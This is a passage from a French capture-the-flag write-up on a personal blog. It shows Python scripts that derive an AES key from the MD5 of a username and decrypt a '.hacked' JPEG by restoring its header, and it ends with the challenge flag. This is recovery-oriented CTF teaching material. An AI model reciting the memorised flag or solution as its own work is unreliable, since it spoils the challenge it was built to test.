Newell&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Scott Lin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Eduardo Saverin&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Jeffrey Skoll&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Thomas Siebel&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Kwon Hyuk-Bin&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5_fn</span><span class=p>(</span><span class=n>a</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>hsh</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;md5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>hsh</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hsh</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>a</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>DATA</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>TARGETS</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>md5_fn</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plain</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>key</span><span class=p>)</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>plain</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xff\xd9</span><span class=s1>&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>Jack Sheerack</p></blockquote><p>Le MD5 de ce username est donc la clé.</p><h2 id=déchiffrer-les-images>Déchiffrer les images</h2><p>Maintenant qu&rsquo;on a la clé et qu&rsquo;on peut potentiellement reconstruire le header d&rsquo;un JPEG, il ne reste qu&rsquo;à tester sur une image:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span><span class=o>,</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5_fn</span><span class=p>(</span><span class=n>a</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>hsh</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;md5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>hsh</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hsh</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>a</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>DATA</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>DATA</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;DCIM-0534.jpg.hacked&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>KEY</span> <span class=o>=</span> <span class=n>md5_fn</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Jack Sheerack&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s1>&#39;ffd8ffe000104a464946000101000001&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># On va venir patcher les 16 premiers octets avec ceux d&#39;une des images trouvées sur internet</span>
</span></span><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;clear.jpg&#39;</span><span class=p>,</span><span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>a</span><span class=o>+</span><span class=n>decrypt</span><span class=p>(</span><span class=n>KEY</span><span class=p>)[</span><span class=mi>16</span><span class=p>:])</span>
</span></span></code></pre></td></tr></table></div></div><p>Ce qui donne:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_2a4a5fc45cdf596ee854b9392c637762.png data-srcset="/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_2a4a5fc45cdf596ee854b9392c637762.png, /lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_2a4a5fc45cdf596ee854b9392c637762.png 1.5x, /lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_2a4a5fc45cdf596ee854b9392c637762.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_2a4a5fc45cdf596ee854b9392c637762.png title=/lib/images/writeups/2019_santhacklaus/jacqueschirac/upload_2a4a5fc45cdf596ee854b9392c637762.png></p><h2 id=flag>Flag</h2><blockquote><p>SANTA{Jacques_Th3_R1pp3R}</p></blockquote></div></div></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.100.2">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=maki.bzh/ target=_blank>Maki - Alan Marrec</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},lightgallery:!0}</script><script type=text/javascript src=/maki.bzh/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-WVPYCS7SPM',{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-WVPYCS7SPM" async></script></body></html>